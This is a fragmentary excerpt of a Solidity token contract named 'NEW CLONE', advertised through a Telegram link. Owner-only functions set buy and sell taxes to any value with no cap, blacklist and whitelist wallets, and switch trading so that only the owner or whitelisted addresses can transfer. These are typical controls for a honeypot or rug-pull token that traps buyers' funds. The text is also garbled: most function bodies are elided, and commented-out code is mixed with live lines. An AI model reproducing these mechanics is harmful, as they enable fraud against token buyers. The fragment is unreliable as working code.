...
// telegram : https://t.me/clonetoken123
...
contract NEWClone is Context, IERC20 { 
    ...
    address payable private Wallet_Marketing = payable(0xda208E247974D256C66C31B6491631a27B1f4aa2); 
    address payable private Wallet_Dev = payable(0xda208E247974D256C66C31B6491631a27B1f4aa2);
    address payable private constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private _tTotal = 1000000000 * (10 ** _decimals);
    string private constant _name = "NEW CLONE"; 
    ...
    uint256 public _Tax_On_Sell = 1;
     function _FeesTax(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {

       _Tax_On_Sell = Sell_Fee;
       _Tax_On_Buy = Buy_Fee;
    }

    uint256 private Percent_Marketing = 100;
    ...
    constructor () {
        ...
        _owner = 0xda208E247974D256C66C31B6491631a27B1f4aa2;
    ...
    function StyleOpen(bool open) external onlyOwner {
        _open = open;
    }
    ...
    function _transfer(
        ...
        require(_open || from == owner()|| to == owner() || _isWhitelisted[from] || _isWhitelisted[to], "Owner or wl only");
    ...
    */
    ...
    function BLLadd(address[] calldata addresses) external onlyOwner {
    ...
    function BLLadd1(address addresses) external onlyOwner {
    ...
    function PrenWlp(address addresses) external onlyOwner {
    ...
    function BLL_rmv(address[] calldata addresses) external onlyOwner {
    ...
    function BLL_rmve(address addresses) external onlyOwner {
    ...
    function prenwli_rmv(address addresses) external onlyOwner {
    ...
    //     startGas = gasleft();
    //     if(_isBlacklisted[addresses[i]]){
        _isWhitelisted[addresses] = false;
    // }
    //     gasUsed = startGas - gasleft();
    // }
    // }
    ...
    function Limit_Buy(uint256 maxTxPercent_x100) external onlyOwner() {
        _maxTxAmount = _tTotal*maxTxPercent_x100/10000;
    }    
    
    // Set the maximum wallet holding (percent of total supply)
     function Limit_Wallet(uint256 maxWallPercent_x100) external onlyOwner() {
